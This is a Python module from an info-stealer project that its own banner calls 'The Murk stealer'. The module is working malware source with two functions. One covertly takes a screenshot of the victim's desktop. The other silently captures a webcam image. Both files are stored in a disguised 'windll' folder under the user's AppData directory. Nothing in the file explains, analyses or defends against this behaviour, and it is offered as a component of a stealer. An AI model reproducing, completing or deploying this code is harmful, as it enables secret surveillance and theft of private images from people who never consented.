#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
from PIL import ImageGrab
from os import environ,sep
from cv2 import VideoCapture, imwrite
from manager.logger import Log

def Screenshot():
	try:
		pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
		screen = ImageGrab.grab()
		screen.save(rf'{pathtofolder}\windll\Photos\sreenshot.jpg')
	except Exception as e:
		Log(f"Screenshot ---> {e}")

def WebCam(): 
	try:
		pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
		cap = VideoCapture(0)
		for i in range(30):
			cap.read()
		ret, frame = cap.read()
		imwrite(pathtofolder+'\\windll\\Photos\\webcam.png', frame)   
		cap.release()
	except Exception as e:
		Log(f"WebCam ---> {e}")